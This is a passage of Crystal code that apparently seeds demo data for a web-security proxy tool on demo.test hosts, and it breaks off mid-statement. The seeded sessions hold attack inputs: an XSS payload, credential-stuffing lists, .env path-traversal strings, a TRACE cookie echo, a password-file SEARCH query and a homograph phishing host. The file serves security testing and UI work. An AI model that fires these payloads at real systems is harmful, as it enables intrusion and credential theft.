# outbound frames live in ws_messages beside the captured ones.
ws_repeater_req = String.build do |b|
  b << "GET /ws/chat HTTP/1.1\r\n"
  b << "Host: api.demo.test\r\n"
  b << "Upgrade: websocket\r\n"
  b << "Connection: Upgrade\r\n"
  b << "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
  b << "Sec-WebSocket-Version: 13\r\n"
  b << "Origin: https://shop.demo.test\r\n\r\n"
end
ids[:repeater_ws] = store.insert_repeater("wss://api.demo.test", ws_repeater_req.to_slice,
  false, true, ids[:ws], 5, ws_keep_key: true)
store.set_repeater_name(ids[:repeater_ws], "WS chat")
store.update_repeater_ws_messages(ids[:repeater_ws], [
  S::WsOutMessage.text(%({"type":"hello","user":"alice","room":"general"})),
  S::WsOutMessage.text(%({"type":"msg","text":"replayed from the WS repeater"})),
  S::WsOutMessage.text(%({"type":"msg","text":"<img src=x onerror=alert(1)>"})),
  S::WsOutMessage.new(2, Bytes[0x08, 0x96, 0x01, 0x12, 0x05, 0x61, 0x6c, 0x69, 0x63, 0x65]),
])

# The OAuth token exchange, ready to re-send with a different client_id/scope.
token_req = replay_req("POST", "auth.demo.test", "/oauth/token",
  {"Content-Type" => "application/x-www-form-urlencoded"},
  "grant_type=refresh_token&refresh_token=1//0edemo-refresh-token&client_id=shop-web&client_secret=sh0p-w3b-cl13nt-s3cr3t")
ids[:repeater_token] = store.insert_repeater("https://auth.demo.test", token_req.to_slice,
  false, true, ids[:oauth_token], 6)
store.set_repeater_name(ids[:repeater_token], "OAuth refresh")
store.set_repeater_tags(ids[:repeater_token], "oauth auth")

store.set_repeater_tags(ids[:repeater_xss], "xss poc")
store.set_repeater_tags(ids[:repeater_idor], "idor authz")
store.set_repeater_tags(ids[:repeater_ssrf], "ssrf oast")

# One tab opens with its LAST response already in the pane (V11 persists it), so the
# Repeater tab isn't empty until you send — and the Comparer has a second body to diff.
idor_resp_head = "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\nContent-Length: 96\r\n\r\n"
store.update_repeater_response(ids[:repeater_idor], idor_resp_head.to_slice,
  %({"id":2,"name":"Bob","email":"bob@demo.test","role":"admin","phone":"+1-555-0102"}).to_slice,
  nil, 34_000_i64)

fuzz_template = replay_req("GET", "api.demo.test", "/v1/users/§1§",
  {"Authorization" => "Bearer #{jwt}"})
ids[:fuzz_users] = store.insert_fuzz_session("https://api.demo.test", fuzz_template,
  false, nil, %({"mode":"sniper","sets":[{"kind":"numbers","value":"1-10"}]}),
  ids[:idor], 0, "user id enum")

# A second fuzz session in CLUSTER BOMB mode with two positions: the credential-stuffing
# shape (every username × every password), and a payload-per-position set list.
login_template = replay_req("POST", "shop.demo.test", "/api/login",
  {"Content-Type" => "application/json"}, %({"username":"§alice§","password":"§hunter2§"}))
ids[:fuzz_login] = store.insert_fuzz_session("https://shop.demo.test", login_template,
  false, nil,
  %({"mode":"ClusterBomb","concurrency":4,"sets":[{"kind":"list","value":"alice\\nbob\\nadmin"},{"kind":"list","value":"hunter2\\npassword\\nadmin123\\nletmein"}],"filter_status":"401"}),
  ids[:login], 1, "login cluster bomb")

# A third one whose position carries a DECODER CHAIN: `§value¦chain§` runs each payload
# through `url-encode` on the way out, which is how a traversal list survives the path.
traversal_template = replay_req("GET", "shop.demo.test", "/assets/§app.js¦url-encode§")
ids[:fuzz_traversal] = store.insert_fuzz_session("https://shop.demo.test", traversal_template,
  false, nil,
  %({"mode":"sniper","sets":[{"kind":"list","value":"app.js\\n../.env\\n../../.env\\n....//....//.env"}],"match_status":"200,500"}),
  ids[:dotenv], 2, "path traversal")

miner_req = replay_req("GET", "api.demo.test", "/v1/users/1",
  {"Authorization" => "Bearer #{jwt}"}).to_slice
ids[:miner_users] = store.insert_miner_session("https://api.demo.test", miner_req,
  false, nil,
  %({"locations":["query"],"concurrency":4,"notify":"off","stability_rounds":2,"confirm_rounds":1,"buckets":{"query":50}}),
  ids[:idor], 0, "users path mine")

# A second mine over a DIFFERENT location set: headers + cookies, which is how you find
# the debug/impersonation header a docs page never mentions.
miner_products = replay_req("GET", "api.demo.test", "/v1/products",
  {"Authorization" => "Bearer #{jwt}"}).to_slice
ids[:miner_headers] = store.insert_miner_session("https://api.demo.test", miner_products,
  false, nil,
  %({"locations":["headers","cookies"],"concurrency":6,"notify":"off","stability_rounds":2,"confirm_rounds":2,"buckets":{"headers":25,"cookies":25}}),
  nil, 1, "header/cookie mine")

# Sequencer: analyze the randomness of the `sid` session cookie minted by /api/login.
# Collected tokens are never persisted — the session stores only the request + descriptor.
seq_req = replay_req("POST", "shop.demo.test", "/api/login",
  {"Content-Type" => "application/json"}, %({"username":"alice","password":"hunter2"})).to_slice
ids[:seq_sid] = store.insert_sequencer_session("https://shop.demo.test", seq_req,
  false, nil,
  %({"mode":"manual","kind":"cookie","selector":"sid","pos_start":0,"pos_end":0,"goal":500,"concurrency":4,"notify":"off"}),
  ids[:login], 0, "sid randomness")

# A second one graded on a HEADER instead of a cookie, over a fixed byte range — the
# OAuth code is minted per authorize call, so its varying region is what to measure.
seq_code = replay_req("GET", "auth.demo.test",
  "/authorize?response_type=code&client_id=shop-web&redirect_uri=https%3A%2F%2Fshop.demo.test%2Fcallback&state=xyz789").to_slice
ids[:seq_code] = store.insert_sequencer_session("https://auth.demo.test", seq_code,
  false, nil,
  %({"mode":"manual","kind":"header","selector":"Location","pos_start":49,"pos_end":72,"goal":300,"concurrency":4,"notify":"off"}),
  nil, 1, "oauth code entropy")

puts "• inserted 7 repeater (1 ws, 1 bound) + 3 fuzz + 2 miner + 2 sequencer sessions"

# --- Act four: where a flow came from (the History SRC column) ---------------
# Everything above is `proxy` — traffic a client sent through gori — and until this section
# existed that was the ONLY provenance the demo could show, which is exactly the state
# History itself was in: a Repeater send, an agent's `send_request`, a crawl and an import
# all landed here as rows indistinguishable from captured traffic.
#
# Seeded LAST, and after the workbench sessions, because `source_ref` points back at a real
# repeater/fuzz row — a demo that pointed at an id nothing owns would teach the wrong thing
# about what the field means.
#
# Only the sources gori ACTUALLY records are seeded. `miner`, `sequencer`, `authorize` and
# `probe` are members of `FlowSource::Kind` because `Fuzz::HistoryRecord` takes the source as
# an argument and those tools sweep through the same sender — but none of them writes a flow
# today, and seeding a label no code path produces would put fiction in the evidence store.

# REPEATER, from the TUI: the operator changed one field of a captured order and re-sent it
# by hand. This is the row the SRC column exists for — same endpoint, same shape, same 200
# as the captured traffic above, and NOT something the shop's own client ever sent.
rptr_body = %({"id":9,"total":1,"items":2})
raw_flow(store, t.call(162), host: "api.demo.test", method: "POST", target: "/v1/orders/9",
  req_head: "POST /v1/orders/9 HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Authorization: Bearer #{jwt}\r\nContent-Type: application/json\r\n" \
            "Content-Length: #{rptr_body.bytesize}\r\n\r\n",
  req_body: rptr_body.to_slice,
  status: 200, reason: "OK", ctype: "application/json",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n" \
             "Content-Length: 34\r\n\r\n",
  resp_body: %({"id":9,"total":1,"status":"paid"}).to_slice, dur_us: 41_000_i64,
  source: FS::Kind::Repeater, source_surface: FS::Surface::Tui,
  source_ref: ids[:repeater_idor].to_s)

# REPEATER, from MCP: the same tool, a different surface — `send_request` records by
# default, so an agent working beside the operator has been writing into this table all
# along. The surface column is the only thing that separates the two rows.
raw_flow(store, t.call(163), host: "api.demo.test", method: "GET", target: "/v1/users/2",
  req_head: "GET /v1/users/2 HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Authorization: Bearer #{jwt}\r\nAccept: application/json\r\n\r\n",
  status: 200, reason: "OK", ctype: "application/json",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n" \
             "Content-Length: 58\r\n\r\n",
  resp_body: %({"id":2,"email":"bob@demo.test","role":"admin","mfa":false}).to_slice,
  dur_us: 37_000_i64,
  source: FS::Kind::Repeater, source_surface: FS::Surface::Mcp,
  source_ref: ids[:repeater_idor].to_s)

# FUZZER: one hit out of the traversal sweep, recorded because the run asked for evidence
# (`--record-history matched`). The payload is on the wire, which is why reading this row as
# "the origin serves .env" without noticing the SRC column would be a mistake.
raw_flow(store, t.call(164), host: "shop.demo.test", method: "GET",
  target: "/assets/..%2F..%2F.env",
  req_head: "GET /assets/..%2F..%2F.env HTTP/1.1\r\nHost: shop.demo.test\r\n" \
            "User-Agent: gori-demo/1.0\r\nAccept: */*\r\n\r\n",
  status: 200, reason: "OK", ctype: "text/plain",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: text/plain\r\n" \
             "Content-Length: 63\r\n\r\n",
  resp_body: "DB_PASSWORD=demo-only-not-real\nSTRIPE_KEY=sk_test_demo_only\n".to_slice,
  dur_us: 22_000_i64,
  source: FS::Kind::Fuzzer, source_surface: FS::Surface::Cli,
  source_ref: ids[:fuzz_traversal].to_s)

# DISCOVER: a crawl finding. These have been persisted by default since the tab shipped —
# the crawler fetched this URL, no browser ever asked for it, and until the column existed
# the sitemap could not say so.
raw_flow(store, t.call(165), host: "shop.demo.test", method: "GET", target: "/.well-known/security.txt",
  req_head: "GET /.well-known/security.txt HTTP/1.1\r\nHost: shop.demo.test\r\n" \
            "User-Agent: gori-demo/1.0\r\nAccept: */*\r\n\r\n",
  status: 200, reason: "OK", ctype: "text/plain",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: text/plain\r\n" \
             "Content-Length: 52\r\n\r\n",
  resp_body: "Contact: mailto:security@demo.test\nExpires: 2027-01-01\n".to_slice,
  dur_us: 18_000_i64,
  source: FS::Kind::Discover, source_surface: FS::Surface::Tui)

# IMPORT: read out of somebody else's capture. NOT `sent_by_gori?` — gori never put this on
# a wire, and `source_ref` names the file it came out of, which is the provenance question
# an operator actually asks of an imported row.
raw_flow(store, t.call(166), host: "partner.demo.test", method: "POST", target: "/api/v2/webhook",
  req_head: "POST /api/v2/webhook HTTP/1.1\r\nHost: partner.demo.test\r\n" \
            "User-Agent: PartnerBot/2.1\r\nContent-Type: application/json\r\n" \
            "X-Signature: sha256=6f1c0e2a\r\nContent-Length: 41\r\n\r\n",
  req_body: %({"event":"order.paid","order_id":"9","v":2}).to_slice,
  status: 202, reason: "Accepted", ctype: "application/json",
  resp_head: "HTTP/1.1 202 Accepted\r\nContent-Type: application/json\r\nContent-Length: 16\r\n\r\n",
  resp_body: %({"queued":true}).to_slice, dur_us: 58_000_i64,
  source: FS::Kind::Import, source_ref: "partner-webhooks.har")

store.flush
puts "• inserted act-four provenance: 2 repeater (tui · mcp), 1 fuzzer, 1 discover, 1 import"

# --- Act five: every METHOD, and the columns themselves ---------------------
# Acts one through four vary the PROTOCOL and the PROVENANCE. This one varies the two
# things History renders into a FIXED-WIDTH cell, and therefore the two it can get wrong
# entirely on its own: the METHOD column (8 cells wide, coloured per verb by
# `Theme.method_color`) and the HOST / PATH / STA / TYPE / SIZE / DUR strip beside it.
#
# It exists to be LOOKED AT, not queried. Traffic that is all GET and POST on
# `shop.demo.test` never shows what an 8-cell method column does with `VERSION-CONTROL`,
# what the path column does with a double-width syllable or a right-to-left run, what
# `fmt_size` prints when the capture cap cut the body, or which colour band a 999 lands in
# — and each of those is a rendering defect that can only be seen, never asserted in a spec.
#
# Every method below is one a real client sends: RFC 9110 registers eight (the six the demo
# already had, plus TRACE and QUERY), WebDAV/DeltaV/DASL another ten, and the last three are
# what a hunter's own tooling puts on the wire. Nothing here is invented to fill a column.
#
# Timing: act four ended at `t.call(166)` and `base` is now−180m, so there is no room left
# for a row per minute. These land 15 s apart across the final quarter hour.
col_t = t.call(167)
tick = -> { col_t += 15_000_000_i64 }

# ## The two RFC 9110 methods the demo was missing
#
# TRACE echoes the request back as `message/http` — cross-site tracing, the reason it is
# switched off everywhere it is understood. The echo carries the cookie the client never
# meant to show a script, so the body IS the finding; and `Cookie:` in a RESPONSE body is
# also the shape the passive scan reads.
trace_echo = "TRACE / HTTP/1.1\r\nHost: legacy.demo.test:8080\r\nUser-Agent: gori-demo/1.0\r\n" \
             "Cookie: session=#{flask_cookie}\r\nX-Forwarded-For: 10.0.4.19\r\n" \
             "X-Original-URL: /admin/dashboard\r\n\r\n"
add_flow(store, tick.call, scheme: "http", host: "legacy.demo.test", port: 8080,
  method: "TRACE", target: "/",
  req_headers: {"Cookie"          => "session=#{flask_cookie}",
                "X-Forwarded-For" => "10.0.4.19",
                "X-Original-URL"  => "/admin/dashboard"},
  status: 200, reason: "OK", ctype: "message/http", resp_body: trace_echo, dur_us: 14_000_i64)

# TRACK is IIS's alias for it, and it is here because it is the one that still answers after
# somebody "fixed" TRACE: a config line, a WAF rule or a mod_rewrite guard that names TRACE
# by spelling leaves this open. Same echo, different verb — which is only visible if the
# METHOD column prints the verb the client actually sent.
add_flow(store, tick.call, scheme: "http", host: "legacy.demo.test", port: 8080,
  method: "TRACK", target: "/",
  req_headers: {"Cookie" => "session=#{flask_cookie}"},
  status: 200, reason: "OK", ctype: "message/http",
  resp_body: "TRACK / HTTP/1.1\r\nHost: legacy.demo.test:8080\r\nCookie: session=#{flask_cookie}\r\n\r\n",
  dur_us: 11_000_i64)

# QUERY (RFC 9110's newest registration): safe and idempotent like GET, but it carries a
# REQUEST BODY — the shape a search endpoint wants, and one that caches, WAFs and access
# rules written for "GET has no body, POST is unsafe" have never been pointed at.
# `Theme.method_color` greens it for exactly that reason, so this row also proves the
# colour table is reached by something other than GET.
add_flow(store, tick.call, host: "api.demo.test", method: "QUERY", target: "/v1/search",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"filter":{"tag":"widget","price":{"lt":3000}},"sort":"price","limit":20}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"hits":2,"items":[{"id":1000,"sku":"DW-1000","price":999},{"id":1007,"sku":"DW-1007","price":1048}]}),
  dur_us: 63_000_i64)

# `OPTIONS *` — the server-wide form (RFC 9110 §9.3.7). The request target is not a path and
# not a URL: it is one asterisk. Every surface that turns a row into a URL (the History path
# column, Sitemap, the Repeater seed, `Url.origin_path`) has to notice, and a demo without
# one lets an origin-form assumption survive untested.
raw_flow(store, tick.call, host: "api.demo.test", method: "OPTIONS", target: "*",
  req_head: "OPTIONS * HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: curl/8.6.0\r\n\r\n",
  status: 204, reason: "No Content",
  resp_head: "HTTP/1.1 204 No Content\r\nServer: nginx/1.25.3\r\n" \
             "Allow: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS, QUERY\r\n\r\n",
  dur_us: 8_000_i64)

# ## WebDAV, DeltaV and DASL — the ten-method half of the registry
#
# A file share behind the same auth as everything else. These are not exotica: a `dav.`
# host is how half the internal document servers on a corporate network answer, the verbs
# arrive in this exact order from a mounting client, and two of them (`PROPFIND`, `SEARCH`)
# enumerate paths that no link anywhere points at.
#
# The column arithmetic is the point of the set. `PROPFIND` and `CHECKOUT` are exactly 8
# characters — the cell's full width, which is why the clamp in `render_list` is 8 and not
# the 7-in-8 its neighbours use. `PROPPATCH` is 9 and `VERSION-CONTROL` is 15, so they are
# the rows that show what the clamp DOES.
dav_req = ->(method : String, target : String, extra : String) {
  String.build do |b|
    b << method << ' ' << target << " HTTP/1.1\r\n"
    b << "Host: dav.demo.test\r\nUser-Agent: davfs2/1.6.1 neon/0.32.5\r\n"
    b << "Authorization: Basic ZGVtbzptZXRyaWNzLXB3\r\n"
    b << extra << "\r\n"
  end
}

dav_resp = ->(status : Int32, reason : String, extra : String, body : String?) {
  String.build do |b|
    b << "HTTP/1.1 " << status << ' ' << reason << "\r\n"
    b << "Server: Apache/2.4.41 (Ubuntu) DAV/2\r\nDate: Thu, 19 Jun 2026 09:00:00 GMT\r\n"
    b << extra
    if bd = body
      b << "Content-Type: application/xml; charset=utf-8\r\nContent-Length: " << bd.bytesize << "\r\n"
    end
    b << "\r\n"
  end
}

propfind_body = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>
  XML

propfind_xml = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:multistatus xmlns:D="DAV:">
    <D:response>
      <D:href>/dav/reports/</D:href>
      <D:propstat><D:prop><D:displayname>reports</D:displayname>
        <D:resourcetype><D:collection/></D:resourcetype>
      </D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
    </D:response>
    <D:response>
      <D:href>/dav/reports/q3-forecast-CONFIDENTIAL.docx</D:href>
      <D:propstat><D:prop><D:getcontentlength>884736</D:getcontentlength>
        <D:getlastmodified>Wed, 18 Jun 2026 03:00:00 GMT</D:getlastmodified>
        <D:creator-displayname>bob@demo.test</D:creator-displayname>
      </D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
    </D:response>
    <D:response>
      <D:href>/dav/reports/.svn/wc.db</D:href>
      <D:propstat><D:prop><D:getcontentlength>131072</D:getcontentlength>
      </D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
    </D:response>
  </D:multistatus>
  XML

raw_flow(store, tick.call, host: "dav.demo.test", method: "PROPFIND", target: "/dav/reports/",
  req_head: dav_req.call("PROPFIND", "/dav/reports/",
    "Depth: 1\r\nContent-Type: application/xml\r\nContent-Length: #{propfind_body.bytesize}\r\n"),
  req_body: propfind_body.to_slice,
  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
  resp_head: dav_resp.call(207, "Multi-Status", "", propfind_xml),
  resp_body: propfind_xml.to_slice, dur_us: 96_000_i64)

proppatch_body = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:propertyupdate xmlns:D="DAV:" xmlns:Z="http://demo.test/ns/">
    <D:set><D:prop><Z:classification>public</Z:classification></D:prop></D:set>
  </D:propertyupdate>
  XML
proppatch_xml = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:multistatus xmlns:D="DAV:"><D:response>
    <D:href>/dav/reports/q3-forecast-CONFIDENTIAL.docx</D:href>
    <D:propstat><D:prop/><D:status>HTTP/1.1 200 OK</D:status></D:propstat>
  </D:response></D:multistatus>
  XML
# 9 characters — one past the cell. The property it rewrites is the document's own
# classification, which is a write an operator wants to SEE happen.
raw_flow(store, tick.call, host: "dav.demo.test", method: "PROPPATCH",
  target: "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
  req_head: dav_req.call("PROPPATCH", "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
    "Content-Type: application/xml\r\nContent-Length: #{proppatch_body.bytesize}\r\n"),
  req_body: proppatch_body.to_slice,
  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
  resp_head: dav_resp.call(207, "Multi-Status", "", proppatch_xml),
  resp_body: proppatch_xml.to_slice, dur_us: 44_000_i64)

raw_flow(store, tick.call, host: "dav.demo.test", method: "MKCOL", target: "/dav/2026-exports/",
  req_head: dav_req.call("MKCOL", "/dav/2026-exports/", ""),
  status: 201, reason: "Created",
  resp_head: dav_resp.call(201, "Created", "Location: https://dav.demo.test/dav/2026-exports/\r\n", nil),
  dur_us: 27_000_i64)

# COPY / MOVE take their second operand in a HEADER, not the target — so the row's own path
# tells you only half of what happened, and the detail pane has to be opened for the rest.
raw_flow(store, tick.call, host: "dav.demo.test", method: "COPY",
  target: "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
  req_head: dav_req.call("COPY", "/dav/reports/q3-forecast-CONFIDENTIAL.docx",
    "Destination: https://dav.demo.test/dav/public/q3.docx\r\nOverwrite: T\r\nDepth: 0\r\n"),
  status: 201, reason: "Created",
  resp_head: dav_resp.call(201, "Created", "Location: https://dav.demo.test/dav/public/q3.docx\r\n", nil),
  dur_us: 118_000_i64)

raw_flow(store, tick.call, host: "dav.demo.test", method: "MOVE", target: "/dav/public/q3.docx",
  req_head: dav_req.call("MOVE", "/dav/public/q3.docx",
    "Destination: https://dav.demo.test/dav/public/q3-final.docx\r\nOverwrite: F\r\n"),
  status: 204, reason: "No Content",
  resp_head: dav_resp.call(204, "No Content", "", nil), dur_us: 33_000_i64)

lock_body = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:lockinfo xmlns:D="DAV:">
    <D:lockscope><D:exclusive/></D:lockscope>
    <D:locktype><D:write/></D:locktype>
    <D:owner><D:href>mailto:alice@demo.test</D:href></D:owner>
  </D:lockinfo>
  XML
lock_token = "opaquelocktoken:e71d4fae-5dec-22d6-fea5-00a0c91e6be4"
lock_xml = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:prop xmlns:D="DAV:"><D:lockdiscovery><D:activelock>
    <D:locktype><D:write/></D:locktype>
    <D:lockscope><D:exclusive/></D:lockscope>
    <D:depth>0</D:depth>
    <D:owner><D:href>mailto:alice@demo.test</D:href></D:owner>
    <D:timeout>Second-3600</D:timeout>
    <D:locktoken><D:href>#{lock_token}</D:href></D:locktoken>
  </D:activelock></D:lockdiscovery></D:prop>
  XML
raw_flow(store, tick.call, host: "dav.demo.test", method: "LOCK",
  target: "/dav/public/q3-final.docx",
  req_head: dav_req.call("LOCK", "/dav/public/q3-final.docx",
    "Timeout: Second-3600\r\nContent-Type: application/xml\r\nContent-Length: #{lock_body.bytesize}\r\n"),
  req_body: lock_body.to_slice,
  status: 200, reason: "OK", ctype: "application/xml; charset=utf-8",
  resp_head: dav_resp.call(200, "OK", "Lock-Token: <#{lock_token}>\r\n", lock_xml),
  resp_body: lock_xml.to_slice, dur_us: 52_000_i64)

# The lock token travels in `Lock-Token:` and nothing else authenticates the release — a
# guessable token IS the authorization here, which is why the pair of rows is worth having
# side by side.
raw_flow(store, tick.call, host: "dav.demo.test", method: "UNLOCK",
  target: "/dav/public/q3-final.docx",
  req_head: dav_req.call("UNLOCK", "/dav/public/q3-final.docx", "Lock-Token: <#{lock_token}>\r\n"),
  status: 204, reason: "No Content",
  resp_head: dav_resp.call(204, "No Content", "", nil), dur_us: 19_000_i64)

# REPORT (RFC 3253 DeltaV, and every CalDAV/CardDAV client on the planet). The request body
# names the report; the answer is another multistatus, and this one hands out a colleague's
# calendar because the ACL was never narrowed past "authenticated".
report_body = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <C:calendar-query xmlns:C="urn:ietf:params:xml:ns:caldav" xmlns:D="DAV:">
    <D:prop><C:calendar-data/></D:prop>
    <C:filter><C:comp-filter name="VCALENDAR"/></C:filter>
  </C:calendar-query>
  XML
report_xml = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:multistatus xmlns:D="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav">
    <D:response><D:href>/dav/calendars/bob/board-2026-06-24.ics</D:href>
      <D:propstat><D:prop><C:calendar-data>BEGIN:VCALENDAR
  SUMMARY:Board review — Q3 forecast (do not forward)
  ATTENDEE:mailto:bob@demo.test
  END:VCALENDAR</C:calendar-data></D:prop>
      <D:status>HTTP/1.1 200 OK</D:status></D:propstat>
    </D:response>
  </D:multistatus>
  XML
raw_flow(store, tick.call, host: "dav.demo.test", method: "REPORT", target: "/dav/calendars/bob/",
  req_head: dav_req.call("REPORT", "/dav/calendars/bob/",
    "Depth: 1\r\nContent-Type: application/xml\r\nContent-Length: #{report_body.bytesize}\r\n"),
  req_body: report_body.to_slice,
  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
  resp_head: dav_resp.call(207, "Multi-Status", "", report_xml),
  resp_body: report_xml.to_slice, dur_us: 88_000_i64)

# SEARCH (RFC 5323 DASL): a query language over the file share, reachable by anyone who can
# read one file in it. The `where` clause below is the enumeration a PROPFIND crawl would
# take an hour to do.
search_body = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:searchrequest xmlns:D="DAV:">
    <D:basicsearch>
      <D:select><D:prop><D:getcontentlength/></D:prop></D:select>
      <D:from><D:scope><D:href>/dav/</D:href><D:depth>infinity</D:depth></D:scope></D:from>
      <D:where><D:like><D:prop><D:displayname/></D:prop>
        <D:literal>%password%</D:literal></D:like></D:where>
    </D:basicsearch>
  </D:searchrequest>
  XML
search_xml = <<-XML
  <?xml version="1.0" encoding="utf-8"?>
  <D:multistatus xmlns:D="DAV:">
    <D:response><D:href>/dav/it/passwords-2026.kdbx</D:href>
      <D:propstat><D:prop><D:getcontentlength>4096</D:getcontentlength></D:prop>
      <D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response>
    <D:response><D:href>/dav/it/wifi-password.txt</D:href>
      <D:propstat><D:prop><D:getcontentlength>38</D:getcontentlength></D:prop>
      <D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response>
  </D:multistatus>
  XML
raw_flow(store, tick.call, host: "dav.demo.test", method: "SEARCH", target: "/dav/",
  req_head: dav_req.call("SEARCH", "/dav/",
    "Content-Type: application/xml\r\nContent-Length: #{search_body.bytesize}\r\n"),
  req_body: search_body.to_slice,
  status: 207, reason: "Multi-Status", ctype: "application/xml; charset=utf-8",
  resp_head: dav_resp.call(207, "Multi-Status", "", search_xml),
  resp_body: search_xml.to_slice, dur_us: 1_240_000_i64)

# `VERSION-CONTROL` (RFC 3253) is 15 characters, the longest method in any IANA registry, and
# the row the METHOD clamp was written for: unclamped it ran straight through PROTO, HOST and
# into PATH, which is the single most direct way to make the whole list unreadable.
raw_flow(store, tick.call, host: "dav.demo.test", method: "VERSION-CONTROL",
  target: "/dav/public/q3-final.docx",
  req_head: dav_req.call("VERSION-CONTROL", "/dav/public/q3-final.docx", ""),
  status: 201, reason: "Created",
  resp_head: dav_resp.call(201, "Created",
    "Cache-Control: no-cache\r\nLocation: https://dav.demo.test/dav/public/q3-final.docx\r\n", nil),
  dur_us: 61_000_i64)

# `CHECKOUT`, the other exactly-8 method, and the one that says the clamp is not truncating
# anything real at that width.
raw_flow(store, tick.call, host: "dav.demo.test", method: "CHECKOUT",
  target: "/dav/public/q3-final.docx",
  req_head: dav_req.call("CHECKOUT", "/dav/public/q3-final.docx", ""),
  status: 200, reason: "OK",
  resp_head: dav_resp.call(200, "OK", "Cache-Control: no-cache\r\n", nil), dur_us: 29_000_i64)

# ## The three verbs a hunter's own tooling puts on the wire
#
# PURGE is Varnish's, not the IANA registry's — and it is answered here with no credential
# at all, which is a cache-poisoning primitive rather than a curiosity. The METHOD column
# greys it (`Theme.method_color`'s `else` branch), which is itself the signal: gori has no
# opinion about a verb it does not know, and the row still has to be legible.
add_flow(store, tick.call, host: "cdn.demo.test", method: "PURGE", target: "/assets/app.min.js",
  status: 200, reason: "Purged", ctype: "text/html",
  resp_headers: {"X-Cache" => "PURGE from cdn-edge-3"},
  resp_body: "<html><head><title>200 Purged</title></head><body><h1>Purged</h1></body></html>\n",
  dur_us: 16_000_i64)

# Lowercase `get`. RFC 9110 §9.1 makes the method case-SENSITIVE, so this is not a GET —
# and an origin that answers it anyway is the classic way past an access rule written as
# `if (method == "GET")`. It has to draw as its own row with the case the client sent, not
# folded into the GETs above, or the demo would be hiding the finding.
add_flow(store, tick.call, host: "shop.demo.test", method: "get", target: "/admin/dashboard",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Admin", "<h1>Admin dashboard</h1><p>Signed in as alice.</p>"),
  dur_us: 37_000_i64)

# A method-fuzz probe: 40 bytes of `A`, which is what a sweep sends to find out whether the
# parser has a length limit before the router does. This is the worst case the 8-cell clamp
# will ever see, and `501` is the honest answer the origin gave.
add_flow(store, tick.call, host: "api.demo.test", method: "A" * 40, target: "/v1/products",
  status: 501, reason: "Not Implemented", ctype: "text/html",
  resp_body: "<html><head><title>501 Not Implemented</title></head><body>" \
             "<center><h1>501 Not Implemented</h1></center><hr><center>nginx/1.25.3</center></body></html>\n",
  dur_us: 7_000_i64)

# ## The HOST and PATH columns
#
# A punycode A-label: `쇼핑몰.한국`, which is what a browser puts in the Host header and
# therefore what the capture stores. Unreadable as stored, correct as stored — the demo's
# job is to make sure the column prints it rather than to pretend the problem away.
add_flow(store, tick.call, host: "xn--352bl7khqr.xn--3e0b707e", target: "/이벤트/여름세일",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_body: html.call("여름 세일", "<h1>여름 세일 — 최대 70%</h1>"), dur_us: 92_000_i64)

# The same host as a U-label, which is what a hand-written client (curl, a script, gori's own
# Repeater) sends when nobody encoded it. Non-ASCII in the HOST column, so the cell's width
# arithmetic has to be measuring DISPLAY columns and not bytes or characters — a Hangul
# syllable is one character, three bytes and two columns wide, and only one of those three
# numbers lays the column out correctly.
add_flow(store, tick.call, host: "쇼핑몰.한국", target: "/api/주문/9",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"주문번호":9,"상태":"결제완료","금액":3998}), dur_us: 74_000_i64)

# A homograph: the leading character is Cyrillic `ѕ` (U+0455), not Latin `s`. Side by side
# with `shop.demo.test` in the same list, at the same width, and that is the whole exercise —
# if the two rows are indistinguishable on screen, so is the phishing origin from the real one.
add_flow(store, tick.call, host: "ѕhop.demo.test", target: "/login",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_headers: {"Set-Cookie" => "sid=harvested; Path=/"},
  resp_body: html.call("Demo Shop", "<h1>Sign in</h1><form method=post action=/login>…</form>"),
  dur_us: 105_000_i64)

# Emoji and a right-to-left run in one path. The emoji is astral-plane (one grapheme, two
# columns, four bytes) and the Hebrew reverses the visual order of everything after it, so
# this row is where a column boundary computed from `String#size` shows itself.
add_flow(store, tick.call, host: "shop.demo.test",
